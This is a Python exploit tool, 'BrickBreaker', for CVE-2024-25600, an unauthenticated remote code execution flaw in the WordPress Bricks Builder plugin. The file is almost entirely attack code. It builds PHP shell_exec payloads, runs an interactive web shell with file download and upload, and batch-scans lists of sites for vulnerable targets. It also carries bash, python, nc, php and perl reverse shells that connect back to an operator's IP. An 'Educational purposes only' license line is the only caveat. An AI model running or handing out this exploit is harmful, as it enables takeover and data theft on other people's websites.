#!/usr/bin/env python3
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  CVE-2024-25600 - WordPress Bricks Builder RCE Exploit (BrickBreaker v2.2)   â•‘
â•‘  Unauthenticated Remote Code Execution                                        â•‘
â•‘  CVSS: 9.8 (Critical) | Affected: Bricks <= 1.9.6                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
  python3 brickbreaker.py <url>                    # Interactive shell
  python3 brickbreaker.py <url> -c "id"            # Single command
  python3 brickbreaker.py <url> -p container       # Different payload
  python3 brickbreaker.py --scan targets.txt       # Batch scan

Dependencies:
  pip install httpx rich

Author: Constantines
License: Educational purposes only
"""

import re
import sys
import json
import base64
import argparse
from pathlib import Path
from typing import Optional, Tuple
from dataclasses import dataclass, field

try:
    import httpx
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.prompt import Prompt, Confirm
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[*] Install with: pip install httpx rich")
    sys.exit(1)

# Suppress warnings
import warnings
import logging
warnings.filterwarnings("ignore")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Configuration
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

__version__ = "2.2.0"
__author__ = "Constantines"

BANNER = r"""
[bold red]
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
 â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
 â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
 â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•  â•šâ•â•    â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•
[/bold red]
[cyan]                   CVE-2024-25600 | RCE Exploit | v{version} | by {author}[/cyan]
"""

PAYLOADS = {
    "code": lambda cmd: {
        "name": "code",
        "settings": {
            "executeCode": "true",
            "code": f'<?php echo "BRKSTART"; echo shell_exec("{cmd}"); echo "BRKEND"; ?>'
        }
    },
    "container": lambda cmd: {
        "name": "container",
        "settings": {
            "hasLoop": "true",
            "query": {
                "useQueryEditor": True,
                "queryEditor": f'throw new Exception("BRKSTART" . shell_exec("{cmd}") . "BRKEND");'
            }
        }
    },
    "carousel": lambda cmd: {
        "name": "carousel",
        "settings": {
            "type": "posts",
            "query": {
                "useQueryEditor": True,
                "queryEditor": f'throw new Exception("BRKSTART" . shell_exec("{cmd}") . "BRKEND");'
            }
        }
    },
}

# Reverse shells with nohup & background for HTTP-based RCE
REVERSE_SHELLS = {
    "bash": 'nohup bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1" &',
    "python": 'nohup python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &',
    "nc": 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f &',
    "php": 'nohup php -r \'$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\' &',
    "perl": 'nohup perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\' &',
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Data Classes
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

@dataclass
class SessionState:
    """Maintains shell session state"""
    nonce: Optional[str] = None
    cwd: str = "/var/www/html"
    user: Optional[str] = None
    hostname: Optional[str] = None
    history: list = field(default_factory=list)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Core Exploit Class
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class BrickBreaker:
    """CVE-2024-25600 Exploit Class"""
    
    def __init__(self, url: str, payload_type: str = "code", timeout: int = 30):
        self.url = url.rstrip("/")
        self.payload_type = payload_type
        self.timeout = timeout
        self.console = Console()
        self.state = SessionState()
        
        # HTTP client
        self.client = httpx.Client(
            timeout=timeout,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            follow_redirects=True
        )
        
    def __enter__(self):
        return self
        
    def __exit__(self, *args):
        self.client.close()
    
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Nonce Extraction
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    
    def fetch_nonce(self) -> Optional[str]:
        """Extract nonce from target"""
        
        endpoints = [self.url, f"{self.url}/?p=1"]
        patterns = [
            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
            r"'nonce'\s*:\s*'([a-f0-9]{10})'",
            r'nonce["\s:]+([a-f0-9]{10})',
        ]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Extracting nonce..."),
            console=self.console,
            transient=True
        ) as progress:
            progress.add_task("nonce", total=None)
            
            for endpoint in endpoints:
                try:
                    resp = self.client.get(endpoint)
                    for pattern in patterns:
                        match = re.search(pattern, resp.text)
                        if match:
                            self.state.nonce = match.group(1)
                            return self.state.nonce
                except httpx.HTTPError:
                    continue
                    
        return None
    
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Command Execution
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    
    def execute(self, command: str, silent: bool = False) -> Tuple[bool, str]:
        """Execute command via RCE - always returns string output"""
        
        if not self.state.nonce:
            if not self.fetch_nonce():
                return False, "Failed to obtain nonce"
        
        endpoint = f"{self.url}/wp-json/bricks/v1/render_element"
        
        # Escape quotes in command for shell
        safe_cmd = command.replace('"', '\\"')
        
        # Build payload
        payload = self._build_payload(safe_cmd)
        
        try:
            resp = self.client.post(
                endpoint,
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            return self._parse_response(resp)
        except httpx.HTTPError as e:
            if not silent:
                self.console.print(f"[red]Request failed: {e}[/]")
            return False, str(e)
        except httpx.ReadTimeout:
            # Timeout might mean reverse shell connected
            return True, "[Timeout - command may still be running]"
    
    def _build_payload(self, command: str) -> dict:
        """Construct exploit payload"""
        
        base = {"postId": "1", "nonce": self.state.nonce}
        element_builder = PAYLOADS.get(self.payload_type, PAYLOADS["code"])
        
        return {**base, "element": element_builder(command)}
    
    def _parse_response(self, response: httpx.Response) -> Tuple[bool, str]:
        """Extract command output from response"""
        
        if response.status_code != 200:
            return False, f"HTTP {response.status_code}"
        
        text = response.text
        
        # Try to extract from JSON first
        try:
            data = response.json()
            text = data.get("data", {}).get("html", text)
        except json.JSONDecodeError:
            pass
        
        # Extract output between markers
        patterns = [
            r"BRKSTART(.*?)BRKEND",           # Our markers
            r"Exception:\s*(.*?)(?:in\s*/|$)", # Exception message
            r"<pre>(.*?)</pre>",               # Pre tags
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.DOTALL)
            if match:
                output = match.group(1).strip()
                # Clean up HTML entities
                output = output.replace("&lt;", "<").replace("&gt;", ">")
                output = output.replace("&amp;", "&").replace("&quot;", '"')
                return True, output
        
        # If no markers found but got 200, command might have no output
        if "render_element" in str(response.url):
            return True, ""
            
        return False, "Could not parse response"
    
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Vulnerability Check
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    
    def check_vulnerable(self) -> bool:
        """Test if target is vulnerable"""
        
        success, output = self.execute("echo VULN_TEST_OK", silent=True)
        
        if success and "VULN_TEST_OK" in output:
            _, self.state.user = self.execute("whoami", silent=True)
            _, self.state.hostname = self.execute("hostname", silent=True)
            # Get initial working directory
            _, pwd = self.execute("pwd", silent=True)
            if pwd:
                self.state.cwd = pwd.strip()
            return True
            
        return False
    
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Interactive Shell
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    
    def interactive_shell(self):
        """Launch interactive shell"""
        
        self.console.print(Panel.fit(
            f"[green]Shell established![/]\n"
            f"[dim]User:[/] {self.state.user or 'unknown'}\n"
            f"[dim]Host:[/] {self.state.hostname or 'unknown'}\n"
            f"[dim]Type 'help' for commands, 'exit' to quit[/]",
            title="ğŸš BrickBreaker Shell",
            border_style="green"
        ))
        
        while True:
            try:
                # Build prompt
                user = self.state.user.strip() if self.state.user else "www-data"
                host = self.state.hostname.strip() if self.state.hostname else "target"
                cwd = self.state.cwd.strip() if self.state.cwd else "/var/www/html"
                
                prompt = f"[bold red]{user}@{host}[/]:[bold blue]{cwd}[/]$ "
                
                cmd = Prompt.ask(prompt).strip()
                
                if not cmd:
                    continue
                    
                # Built-in commands
                cmd_lower = cmd.lower()
                
                if cmd_lower == "exit" or cmd_lower == "quit":
                    break
                elif cmd_lower == "clear":
                    self.console.clear()
                    continue
                elif cmd_lower == "help":
                    self._show_help()
                    continue
                elif cmd_lower == "info":
                    self._show_info()
                    continue
                elif cmd_lower.startswith("download "):
                    self._download_file(cmd[9:].strip())
                    continue
                elif cmd_lower.startswith("upload "):
                    self._upload_file(cmd[7:].strip())
                    continue
                elif cmd_lower == "revshell":
                    self._generate_revshell()
                    continue
                    
                # Handle cd command
                if cmd.startswith("cd "):
                    new_dir = cmd[3:].strip()
                    if new_dir:
                        # Test if directory exists and get absolute path
                        success, result = self.execute(f"cd {self.state.cwd} && cd {new_dir} && pwd")
                        if success and result.strip():
                            self.state.cwd = result.strip()
                        else:
                            self.console.print(f"[red]cd: {new_dir}: No such directory[/]")
                    continue
                
                # Execute command with cwd context
                full_cmd = f"cd {self.state.cwd} && {cmd}"
                success, output = self.execute(full_cmd)
                
                # Always show output or status
                if success:
                    if output:
                        self.console.print(output)
                    # Empty output is fine for some commands (touch, mkdir, etc)
                else:
                    self.console.print(f"[red][-] Error: {output}[/]")
                    
                self.state.history.append(cmd)
                
            except KeyboardInterrupt:
                self.console.print("\n[yellow]Use 'exit' to quit[/]")
            except EOFError:
                break
                
        self.console.print("[dim]Session closed.[/]")
    
    def _show_help(self):
        """Display help"""
        table = Table(title="Shell Commands", border_style="cyan")
        table.add_column("Command", style="green")
        table.add_column("Description")
        
        for cmd, desc in [
            ("help", "Show this help"),
            ("info", "Session information"),
            ("clear", "Clear screen"),
            ("download <file>", "Download file from target"),
            ("upload <file>", "Upload file to target"),
            ("revshell", "Generate reverse shell"),
            ("exit", "Close session"),
        ]:
            table.add_row(cmd, desc)
        self.console.print(table)
    
    def _show_info(self):
        """Display session info"""
        table = Table(title="Session Info", border_style="cyan")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")
        
        _, kernel = self.execute("uname -r", silent=True)
        _, ip = self.execute("hostname -I | awk '{print $1}'", silent=True)
        
        for prop, val in [
            ("Target", self.url),
            ("User", self.state.user),
            ("Hostname", self.state.hostname),
            ("Kernel", kernel),
            ("IP Address", ip),
            ("Working Dir", self.state.cwd),
            ("Nonce", self.state.nonce),
            ("Payload", self.payload_type),
        ]:
            table.add_row(prop, str(val or "unknown").strip())
        self.console.print(table)
    
    def _download_file(self, remote_path: str):
        """Download file from target"""
        if not remote_path:
            self.console.print("[red]Usage: download <filepath>[/]")
            return
            
        # Handle relative paths
        if not remote_path.startswith("/"):
            remote_path = f"{self.state.cwd}/{remote_path}"
            
        success, content = self.execute(f"base64 -w0 {remote_path} 2>/dev/null")
        if success and content and not content.startswith("["):
            try:
                decoded = base64.b64decode(content.strip())
                local_name = Path(remote_path).name
                Path(local_name).write_bytes(decoded)
                self.console.print(f"[green]âœ“ Downloaded:[/] {local_name} ({len(decoded)} bytes)")
            except Exception as e:
                self.console.print(f"[red]âœ— Decode failed:[/] {e}")
        else:
            self.console.print(f"[red]âœ— Failed to read file:[/] {remote_path}")
    
    def _upload_file(self, local_path: str):
        """Upload file to target"""
        if not local_path:
            self.console.print("[red]Usage: upload <filepath>[/]")
            return
            
        try:
            content = base64.b64encode(Path(local_path).read_bytes()).decode()
            remote = f"/tmp/{Path(local_path).name}"
            success, _ = self.execute(f"echo '{content}' | base64 -d > {remote}")
            if success:
                self.console.print(f"[green]âœ“ Uploaded to:[/] {remote}")
            else:
                self.console.print("[red]âœ— Upload failed[/]")
        except FileNotFoundError:
            self.console.print(f"[red]âœ— Local file not found:[/] {local_path}")
    
    def _generate_revshell(self):
        """Generate and execute reverse shell"""
        ip = Prompt.ask("[cyan]Your IP[/]")
        port = Prompt.ask("[cyan]Your Port[/]", default="4444")
        
        if not ip:
            self.console.print("[red]IP required[/]")
            return
        
        table = Table(title="Reverse Shells", border_style="cyan")
        table.add_column("Type", style="green")
        table.add_column("Payload")
        
        for name, template in REVERSE_SHELLS.items():
            payload = template.format(ip=ip, port=port)
            display = payload[:60] + "..." if len(payload) > 60 else payload
            table.add_row(name, display)
        self.console.print(table)
        
        choices = list(REVERSE_SHELLS.keys()) + ["none"]
        choice = Prompt.ask(
            "[cyan]Execute which?[/]", 
            choices=choices,
            default="none"
        )
        
        if choice != "none":
            self.console.print(f"[yellow]Start listener first:[/] nc -lvnp {port}")
            if Confirm.ask("Continue?"):
                payload = REVERSE_SHELLS[choice].format(ip=ip, port=port)
                self.console.print(f"[dim]Executing: {payload[:50]}...[/]")
                
                # Execute with short timeout since revshell will background
                old_timeout = self.client.timeout
                self.client.timeout = httpx.Timeout(5.0)
                
                try:
                    success, output = self.execute(payload, silent=True)
                    if success:
                        self.console.print("[green]âœ“ Reverse shell payload sent![/]")
                        self.console.print("[yellow]Check your listener for connection[/]")
                    else:
                        self.console.print(f"[red]Failed: {output}[/]")
                except:
                    # Timeout is expected for reverse shells
                    self.console.print("[green]âœ“ Payload sent (connection may be established)[/]")
                finally:
                    self.client.timeout = old_timeout

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CLI
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    console = Console()
    
    parser = argparse.ArgumentParser(
        description="CVE-2024-25600 - WordPress Bricks Builder RCE Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  %(prog)s https://target.com                 Interactive shell
  %(prog)s https://target.com -c "id"         Single command
  %(prog)s https://target.com -p container    Use container payload
  %(prog)s --scan targets.txt                 Batch scan from file
  %(prog)s --scan targets.txt -o vuln.txt     Save vulnerable URLs

Author: {__author__}
        """
    )
    
    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("-c", "--command", help="Execute single command")
    parser.add_argument("-p", "--payload", choices=["code", "container", "carousel"], 
                       default="code", help="Payload type (default: code)")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("-q", "--quiet", action="store_true", help="Minimal output")
    parser.add_argument("--scan", metavar="FILE", help="Batch scan URLs from file")
    parser.add_argument("-o", "--output", help="Save vulnerable URLs to file")
    parser.add_argument("-v", "--version", action="version", 
                       version=f"BrickBreaker v{__version__} by {__author__}")
    
    args = parser.parse_args()
    
    # Show banner
    if not args.quiet:
        console.print(BANNER.format(version=__version__, author=__author__))
    
    # Batch scan mode
    if args.scan:
        scan_targets(args.scan, args.output, args.payload, args.timeout, console)
        return
    
    # Single target mode
    if not args.url:
        parser.print_help()
        return
    
    # Normalize URL
    url = args.url
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    
    with BrickBreaker(url, args.payload, args.timeout) as bb:
        # Fetch nonce
        nonce = bb.fetch_nonce()
        if not nonce:
            console.print("[red]âœ—[/] Failed to extract nonce. Target may not use Bricks.")
            sys.exit(1)
        console.print(f"[green]âœ“[/] Nonce found: [cyan]{nonce}[/]")
        
        # Check vulnerability
        if not bb.check_vulnerable():
            console.print("[red]âœ—[/] Target does not appear vulnerable")
            sys.exit(1)
        
        console.print(f"[green]âœ“[/] Target is [bold red]VULNERABLE[/] to CVE-2024-25600")
        console.print(f"[dim]  User: {bb.state.user} | Host: {bb.state.hostname}[/]")
        
        # Execute
        if args.command:
            success, output = bb.execute(args.command)
            if success:
                console.print(output if output else "[dim]Command executed (no output)[/]")
            else:
                console.print(f"[red]Command failed: {output}[/]")
                sys.exit(1)
        else:
            bb.interactive_shell()


def scan_targets(filepath: str, output: str, payload: str, timeout: int, console: Console):
    """Batch scan multiple targets"""
    
    try:
        urls = [line.strip() for line in Path(filepath).read_text().splitlines() if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]âœ— File not found:[/] {filepath}")
        sys.exit(1)
    
    console.print(f"[cyan]Scanning {len(urls)} targets...[/]\n")
    vulnerable = []
    
    with Progress(console=console) as progress:
        task = progress.add_task("[cyan]Scanning...", total=len(urls))
        
        for url in urls:
            if not url.startswith(("http://", "https://")):
                url = f"https://{url}"
            
            try:
                with BrickBreaker(url, payload, timeout=10) as bb:
                    if bb.fetch_nonce() and bb.check_vulnerable():
                        vulnerable.append(url)
                        console.print(f"[green]âœ“ VULNERABLE:[/] {url}")
                    else:
                        console.print(f"[dim]âœ— Not vulnerable:[/] {url}")
            except Exception as e:
                console.print(f"[red]âœ— Error:[/] {url} - {e}")
            
            progress.update(task, advance=1)
    
    console.print(f"\n[bold]Results:[/] {len(vulnerable)}/{len(urls)} vulnerable")
    
    if output and vulnerable:
        Path(output).write_text("\n".join(vulnerable))
        console.print(f"[green]Saved to:[/] {output}")


if __name__ == "__main__":
    main()
